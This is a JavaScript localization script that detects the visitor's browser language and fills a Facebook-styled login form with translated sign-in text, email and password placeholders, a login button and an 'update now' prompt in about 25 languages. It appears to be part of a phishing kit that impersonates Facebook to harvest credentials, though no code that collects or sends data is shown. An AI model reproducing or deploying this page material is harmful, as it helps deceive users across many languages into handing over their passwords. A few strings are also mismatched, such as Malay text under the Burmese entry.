
transItems = document.querySelectorAll(".translated");
var userLang = (navigator.language || navigator.userLanguage).split('-')[0];
var Translate = {
    ar: {
        dir : 'rtl',
        main : 'تواصل مع الأشخاص المفضلين لديك. <br> سجّل الدخول باستخدام فسيبوك للبدء.',
        user :'عنوان البريد الإلكتروني أو رقم الهاتف المحمول',
        pass :'كلمه السر',
        button :'تسجيل دخول',
        update :'تحديث الان'
    }
    ,
    es :{
        dir : 'ltr',
        main : 'Conéctese con sus personas favoritas. <br> Inicie sesión con Facebook.',
        user :'Dirección de email o teléfono móvil',
        pass :'contraseña',
        button :'Iniciar sesión',
        update :'actualizar ahora'
    },

    mn :{
        dir : 'ltr',
        main : 'Дуртай хүмүүстэйгээ холбогдоорой. <be> Facebook-ээр нэвтэрнэ үү.' ,
        user :'Имэйл хаяг эсвэл гар утас' ,
        pass :'нууц үг' ,
        button : 'Нэвтрэх' ,
        update : 'Одоо шинэчлэх'
    },

    am :{
        dir : 'rtl',
        main : 'ከሚወዷቸው ሰዎች ጋር ይገናኙ።<br>ለመጀመር በፌስቡክ ይግቡ።',
        user :'ኢሜል አድራሻ ወይም የሞባይል ቁጥር',
        pass :'ፕስወርድ',
        button :'ግባ',
        update :'አሁን አዘምን'

    }
    ,
    bg :{
        dir : 'ltr',
        main : 'Свържете се с любимите си хора.<br>Влезте с Facebook, за да започнете.',
        user :'Имейл адрес или мобилен номер',
        pass :'парола',
        button :'Влизам',
        update :'актуализирайте сега'

    }
    ,
    bn :{
        dir : 'ltr',
        main : 'আপনার প্রিয় মানুষদের সাথে সংযোগ করুন৷<br>শুরু করতে Facebook দিয়ে সাইন ইন করুন৷',
        user :'ইমেল ঠিকানা বা মোবাইল নম্বর',
        pass :'পাসওয়ার্ড',
        button :'প্রবেশ করুন',
        update :'এখন হালনাগাদ করুন'

    }
    ,
    cs :{
        dir : 'ltr',
        main : 'Spojte se se svými oblíbenými lidmi.<br>Začněte přihlášením pomocí Facebooku.',
        user :'E-mailová adresa nebo mobilní číslo',
        pass :'Heslo',
        button :'Přihlásit se',
        update :'nyní aktualizovat'

    },
    el :{
        dir : 'ltr',
        main : 'Συνδεθείτε με τα αγαπημένα σας άτομα.<br>Συνδεθείτε στο Facebook για να ξεκινήσετε.',
        user :'Διεύθυνση email ή αριθμός κινητού τηλεφώνου',
        pass :'Κωδικός πρόσβασης',
        button :'Σύνδεση',
        update :'ενημέρωση τώρα'

    },
    fi :{
        dir : 'ltr',
        main : 'Pidä yhteyttä suosikkiihmisiisi.<br>Aloita kirjautumalla sisään Facebookilla.',
        user :'Sähköpostiosoite tai matkapuhelinnumero',
        pass :'Salasana',
        button :'Kirjaudu sisään',
        update :'Päivitä nyt'

    },
    fr :{
        dir : 'ltr',
        main : 'Connectez-vous avec vos personnes préférées.<br>Connectez-vous avec Facebook pour commencer.',
        user :'Adresse e-mail ou numéro de portable',
        pass :'le mot de passe',
        button :'Connexion',
        update :'Mettez à jour maintenant'

    },
    he :{
        dir : 'rtl',
        main : 'התחבר לאנשים האהובים עליך.<br>היכנס עם Facebook כדי להתחיל.',
        user :'כתובת אימייל או מספר טלפון',
        pass :'סיסמה',
        button :'התחברות',
        update :'עדכן כעת'

    },
    hi :{
        dir : 'ltr',
        main : 'अपने पसंदीदा लोगों से जुड़ें।<br>आरंभ करने के लिए Facebook के साथ साइन इन करें।',
        user :'विद्युत डाक पता या मोबाइल नंबर',
        pass :'पासवर्ड',
        button :'लॉग इन करें',
        update :'अभी अद्यतन करें'

    },
    hu :{
        dir : 'ltr',
        main : 'Lépjen kapcsolatba kedvenc embereivel.<br>A kezdéshez jelentkezzen be a Facebookon.',
        user :'E-mail cím vagy mobilszám',
        pass :'Jelszó',
        button :'Belépés',
        update :'Frissítse most'

    },
    id :{
        dir : 'ltr',
        main : 'Terhubung dengan orang-orang favorit Anda.<br>Masuk dengan Facebook untuk memulai.',
        user :'Alamat email atau nomor ponsel',
        pass :'kata sandi',
        button :'Gabung',
        update :'Memperbarui sekarang'

    },
    it :{
        dir : 'ltr',
        main : 'Connettiti con le tue persone preferite.<br>Accedi con Facebook per iniziare.',
        user :'Indirizzo email o numero di cellulare',
        pass :"parola d'ordine",
        button :'Accesso',
        update :'Aggiorna ora'

    },
    my :{
        dir : 'ltr',
        main : 'သင်အကြိုက်ဆုံးလူများနှင့် ချိတ်ဆက်ပါ။<br>စတင်ရန် Facebook ဖြင့် အကောင့်ဝင်ပါ။',
        user :'အီးမေးလ်လိပ်စာ သို့မဟုတ် မိုဘိုင်းနံပါတ်',
        pass :'စကားဝှက်',
        button :'လော့ဂ်အင်',
        update :'Mengemas kini sekarang'

    },
    ne :{
        dir : 'ltr',
        main : 'आफ्नो मनपर्ने व्यक्तिहरूसँग जडान गर्नुहोस्।<br>सुरु गर्न Facebook मा साइन इन गर्नुहोस्।',
        user :'इमेल ठेगाना वा मोबाइल नम्बर',
        pass :'पासवर्ड',
        button :'लग - इन',
        update :'अहिले अपडेट गर्नुहोस्'

    },
    ph :{
        dir : 'ltr',
        main : 'Kumonekta sa iyong mga paboritong tao.<br>Mag-sign in gamit ang Facebook upang makapagsimula.',
        user :'Email address o numero ng mobile',
        pass :'password',
        button :'Mag log in',
        update :'Update ngayon'

    },
    pl :{
        dir : 'ltr',
        main : 'Połącz się ze swoimi ulubionymi ludźmi.<br>Zaloguj się przez Facebooka, aby rozpocząć.',
        user :'Adres email czy numer telefonu',
        pass :'hasło',
        button :'Zaloguj sie',
        update :'Aktualizuj teraz'

    },
    pt :{
        dir : 'ltr',
        main : 'Conecte-se com suas pessoas favoritas. <br> Faça login no Facebook para começar.',
        user :'Endereço de email ou número de celular',
        pass :'senha',
        button :'Conecte-se',
        update :'Atualizar agora'

    },
    ro :{
        dir : 'ltr',
        main : 'Conectează-te cu oamenii tăi preferați.<br>Conectează-te cu Facebook pentru a începe.',
        user :'Adresă de e-mail sau număr de telefon',
        pass :'parola',
        button :'Autentificare',
        update :'Actualizează acum'

    },
    sw :{
        dir : 'ltr',
        main : 'Ungana na watu unaowapenda.<br>Ingia ukitumia Facebook ili kuanza.',
        user :'Anwani ya barua pepe au nambari ya simu',
        pass :'nenosiri',
        button :'Ingia',
        update :'Sasisha sasa'

    },
    th :{
        dir : 'ltr',
        main : 'เชื่อมต่อกับคนที่คุณชื่นชอบ<br>ลงชื่อเข้าใช้ Facebook เพื่อเริ่มต้น',
        user :'ที่อยู่อีเมลหรือหมายเลขโทรศัพท์มือถือ',
        pass :'รหัสผ่าน',
        button :'เข้าสู่ระบบ',
        update :'อัพเดทตอนนี้'

    },
    tr :{
        dir : 'ltr',
        main : 'En sevdiğiniz kişilerle bağlantı kurun.<br>Başlamak için Facebook ile oturum açın.',
        user :'E-posta adresi veya cep telefonu numarası',
        pass :'parola',
        button :'Giriş yapmak',
        update :'Şimdi güncelle'

    },
    ur :{
        dir : 'rtl',
        main : 'اپنے پسندیدہ لوگوں سے جڑیں۔<br>شروع کرنے کے لیے Facebook کے ساتھ سائن ان کریں۔',
        user :'ای میل ایڈریس یا موبائل نمبر',
        pass :'پاس ورڈ',
        button :'لاگ ان کریں',
        update :'تازہ ترین کریں. جدید بنایں'

    },
    vi :{
        dir : 'ltr',
        main : 'Kết nối với những người bạn yêu thích. <br> Đăng nhập bằng Facebook để bắt đầu.',
        user :'Địa chỉ email hoặc số điện thoại di động',
        pass :'mật khẩu mở khóa',
        button :'Đăng nhập',
        update :'Cập nhật bây giờ'

    }
}


transItems[0].style.direction =Translate[userLang].dir;
transItems[1].innerHTML =Translate[userLang].main;
transItems[2].setAttribute("placeholder" , Translate[userLang].user);
transItems[3].setAttribute("placeholder" , Translate[userLang].pass);
transItems[4].value =Translate[userLang].button;
transItems[5].innerHTML =Translate[userLang].update;